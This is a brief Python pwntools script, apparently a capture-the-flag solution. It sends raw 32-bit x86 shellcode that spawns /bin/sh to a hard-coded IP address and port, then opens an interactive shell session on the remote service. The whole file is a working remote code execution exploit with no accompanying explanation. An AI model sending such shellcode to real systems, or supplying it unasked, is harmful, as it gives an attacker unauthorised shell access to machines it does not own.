from pwn import *
# Credit goes to http://www.kernel-panic.it/security/shellcode/shellcode5.html
payload = b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
print(len(payload))
connect = remote("159.65.13.76", 62111)
connect.recvline()
connect.recvline()
connect.recvline()
connect.send_raw(payload)
connect.interactive()
